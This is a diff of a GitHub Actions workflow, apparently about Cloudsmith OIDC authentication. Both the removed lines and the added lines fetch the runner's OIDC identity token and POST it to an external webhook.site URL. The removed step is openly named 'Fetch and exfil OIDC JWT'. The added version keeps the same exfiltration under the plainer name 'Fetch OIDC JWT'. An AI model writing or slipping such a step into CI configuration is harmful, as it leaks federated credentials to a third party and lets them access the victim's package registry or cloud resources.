@@ -1,21 +1,8 @@
-name: Get OIDC Token
-on: [push]
-
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  get-token:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Fetch and exfil OIDC JWT
-        run: |
-          JWT=$(curl -sLS \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=cloudsmith" \
-            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            | jq -r .value)
-          # Enviar para webhook.site
-          curl -s -X POST "https://b5bfbf58-f5a8-419c-a81a-d4690bb5005f.webhook.site" \
-            -H "Content-Type: application/json" \
-            -d "{\"jwt\": \"$JWT\"}"
+- name: Fetch OIDC JWT
+  run: |
+    JWT=$(curl -sLS \
+      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://api.cloudsmith.io/openid/alex-test-3vdp/" \
+      -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+      | jq -r .value)
+    curl -s -X POST "https://b5bfbf58-f5a8-419c-a81a-d4690bb5005f.webhook.site" \
+      -d "{\"jwt\": \"$JWT\"}"
